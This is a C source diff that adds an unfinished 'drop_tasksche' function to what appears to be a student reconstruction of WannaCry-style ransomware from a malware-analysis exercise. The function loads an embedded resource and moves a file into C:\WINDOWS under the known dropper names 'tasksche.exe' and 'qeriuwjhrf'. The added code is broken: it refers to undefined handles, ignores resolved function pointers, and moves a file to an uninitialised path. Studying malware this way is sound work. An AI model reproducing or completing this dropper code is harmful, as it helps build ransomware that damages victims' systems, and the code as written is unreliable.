@@ -39,10 +39,33 @@ int create_service()
        return 0;
 }
 
+//not finished 
+int drop_tasksche()
+{
+    HANDLE hModule = GetModuleHandleW("kernel32.dll");
+
+    //fix these function definitions
+    GetProcAddress(hModule, "CreateProcessA");
+    GetProcAddress(hModule, "CreateFileA");
+    GetProcAddress(hModule, "WriteFile");
+    GetProcAddress(hModule, "CloseHandle");
+
+    HRSRC hResInfo = FindResourceA(hModule3, 1831, "UNK");
+    HGLOBAL hResData = LoadResource(hModule4, hResInfo);
+    LockResource(hResData);
+    SizeofResource((char *)hModule5, (char *)hResInfo2);
+    char szFileName[] = "tasksche.exe";
+    char szPath[MAX_PATH];
+    sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
+    char szPathDisk[MAX_PATH];
+    sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
+    MoveFileExA(szPath, szPathDisk, 1);
+}
+
 int no_argument_handler()
 {
-    //two functions here
     create_service();
+    drop_tasksche();
 }
 
 //https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
